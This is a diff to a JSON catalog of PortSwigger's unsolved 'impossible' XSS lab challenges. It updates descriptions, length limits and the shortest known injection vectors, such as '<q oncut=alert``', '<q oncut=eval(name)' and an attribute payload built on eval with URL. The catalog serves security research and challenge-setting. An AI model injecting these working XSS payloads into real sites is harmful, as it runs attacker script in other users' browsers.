@@ -7,7 +7,7 @@
     },
     {
         "title": "Script based injection but quotes, forward slash and backslash are escaped", 
-        "descriptionHTML": "We often encounter this situation in the wild: you have an injection inside a JavaScript variable and can inject angle brackets, but quotes and forward/backslashes are escaped so you can't simply close the script block.<br><br>The closest we've got to solving this is when you have multiple injection points. <a href=\"http://portswigger-labs.net/xss/script.php?x=%3C!--%3Cscript%3E&y=%3C/script%3E%3Cimg%20src=1%20onerror=alert(1)%3E\">1 within a script based context and one in HTML</a>.",        
+        "descriptionHTML": "We often encounter this situation in the wild: you have an injection inside a JavaScript variable and can inject angle brackets, but quotes and forward/backslashes are escaped so you can't simply close the script block.<br><br>The closest we've got to solving this is when you have multiple injection points. The first <a href=\"http://portswigger-labs.net/xss/script.php?x=%3C!--%3Cscript%3E&y=%3C/script%3E%3Cimg%20src=1%20onerror=alert(1)%3E\">within a script based context and the second in HTML</a>.",        
         "context": "Script",
         "url": "http://portswigger-labs.net/impossible-labs/script-context-escaped-angle-brackets-allowed.php?x=%3C/script%3E%3Cimg%20src=1%20onerror=alert(1)%3E"
     },
@@ -19,11 +19,11 @@
     },
     {
         "title": "Basic context length limit", 
-        "descriptionHTML": "This lab's injection occurs within the basic HTML context but has a length limitation of 18. We came up with a vector that could execute JavaScript in 19 characters: &lt;svg onload=alert`` but can you beat it?",
+        "descriptionHTML": "This lab's injection occurs within the basic HTML context but has a length limitation of 15. Filedescriptor came up with a vector that could execute JavaScript in 16 characters: &lt;q oncut=alert`` but can you beat it?",
         "context": "HTML",
         "url": "https://portswigger-labs.net/impossible-labs/basic-context-length-limit.php?x=%3Csvg%20onload=alert``",
-        "lengthLimit": 18,
-        "closestVector": "<svg onload=alert``"    
+        "lengthLimit": 15,
+        "closestVector": "<q oncut=alert``"    
     },
     {
         "title": "Attribute context length limit", 
@@ -37,17 +37,17 @@
         "title": "Basic context length limit, arbitrary code", 
         "descriptionHTML": "It's all well and good executing JavaScript but if all you can do is call alert what use is that? In this lab we demonstrate the shortest possible way to execute arbitrary code.",
         "context": "HTML",
-        "url": "https://portswigger-labs.net/impossible-labs/basic-context-length-limit-arbitrary.php?x=%3Csvg%20onload=eval(name)",
-        "lengthLimit": 21,    
-        "closestVector": "<svg onload=eval(name)"  
+        "url": "https://portswigger-labs.net/impossible-labs/basic-context-length-limit-arbitrary.php?x=%3Cq%20oncut=eval(name)",
+        "lengthLimit": 19,    
+        "closestVector": "<q oncut=eval(name)"  
     },
     {
         "title": "Attribute context length limit arbitrary code", 
         "descriptionHTML": "Again calling alert proves you can call a function but we created another lab to find the shortest possible attribute based injection with arbitrary JavaScript.",
         "context": "Attribute",
-        "url": "https://portswigger-labs.net/impossible-labs/attribute-context-length-limit-arbitrary.php?x=%22oncut=eval(top.name)+",
-        "lengthLimit": 21,
-        "closestVector": "\"oncut=eval(top.name) "           
+        "url": "https://portswigger-labs.net/impossible-labs/attribute-context-length-limit-arbitrary.php?a=`+alert(document.domain);//&x=%22oncut=%22eval(%27`%27%2bURL)",
+        "lengthLimit": 20,
+        "closestVector": "\"oncut=\"eval('`'+URL)"           
     },
     {
         "title": "Injection occurs inside a frameset but before the body", 
